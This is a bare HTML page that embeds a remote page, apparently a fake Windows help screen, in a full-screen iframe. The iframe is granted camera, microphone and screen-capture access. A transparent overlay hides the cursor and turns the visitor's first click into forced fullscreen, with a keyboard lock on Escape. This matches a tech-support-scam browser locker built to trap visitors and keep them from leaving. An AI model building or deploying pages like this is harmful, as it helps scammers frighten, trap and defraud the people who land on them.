<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
<title></title>
<style>
  html, body { margin: 0; height: 100%; }
  iframe {
    position: fixed; width: 100%; height: 100%;
    border: none; top: 0; left: 0; cursor: none;
  }
</style>
</head>
<body>

<iframe 
  id="f"
  src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
  allowfullscreen webkitallowfullscreen mozallowfullscreen 
  allow="fullscreen *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
</iframe>

<script>
  const frame = document.getElementById('f');

  const overlay = document.createElement('div');
  overlay.style.cssText =
    'position:fixed;inset:0;z-index:9999;background:transparent;cursor:none;';
  document.body.appendChild(overlay);

  function startImmersive() {
    const hasKbLock = navigator.keyboard && navigator.keyboard.lock;
    if (hasKbLock) {
      // Chrome/Edge: lock initiate karo (await NAHI), fir turant fullscreen
      navigator.keyboard.lock(['Escape']).catch(() => {});
      frame.requestFullscreen()
        .then(() => { overlay.style.display = 'none'; })
        .catch(e => console.error('fullscreen fail:', e));
    } else {
      // Firefox
      frame.requestFullscreen({ keyboardLock: 'browser' })
        .then(() => { overlay.style.display = 'none'; })
        .catch(e => console.error('fullscreen fail:', e));
    }
  }

  overlay.addEventListener('click', startImmersive);

  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
      if (navigator.keyboard && navigator.keyboard.unlock) navigator.keyboard.unlock();
      overlay.style.display = 'block';
    }
  });
</script>

</body>
</html>
